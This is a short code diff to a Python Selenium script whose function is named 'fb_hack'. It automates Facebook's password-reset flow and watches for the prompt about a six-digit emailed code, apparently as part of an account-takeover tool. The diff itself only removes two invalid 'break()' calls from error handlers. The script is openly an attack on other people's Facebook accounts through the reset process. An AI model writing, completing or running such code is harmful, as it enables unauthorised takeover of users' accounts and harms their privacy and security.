@@ -62,7 +62,6 @@ def fb_hack(email, codex):
     sleep(2)
     driver.save_screenshot("fail2.png")
     print("Failed at try another way")
-    break()
   try:
     search_button = driver.find_element(by = By.NAME, value = "reset_action")
     search_button.click()
@@ -71,7 +70,6 @@ def fb_hack(email, codex):
     sleep(2)
     driver.save_screenshot("fail3.png")
     print("Failed at reset action")
-    break()
   counter = 0
   test = soup.find(string="pop")
   sixdigits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
